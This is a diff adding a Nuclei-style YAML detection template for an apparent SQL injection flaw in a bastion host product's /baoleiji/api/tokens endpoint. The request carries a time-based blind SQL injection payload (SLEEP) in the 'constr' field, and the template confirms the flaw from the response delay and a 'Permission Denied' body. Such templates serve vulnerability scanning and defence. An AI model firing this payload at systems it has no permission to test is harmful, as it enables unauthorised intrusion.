@@ -1,0 +1,31 @@
+id: poc-yaml-zyql-blj-sql-injection
+info:
+  name: "中远鲲鹏堡垒机 接口SQL注入"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 中远鲲鹏堡垒机
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{rand_int(5, 10)}}"
+
+http:
+  - raw:
+      - |
+        POST /baoleiji/api/tokens HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP({{t1}})))ptGN) AND 'AAdm'='AAdm&title=%40127.0.0.1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 403
+      - type: dsl
+        dsl:
+          - duration > t1
+      - type: word
+        part: body
+        words:
+          - "{\"message\":\"Permission Denied.\",\"translatableMessage\""
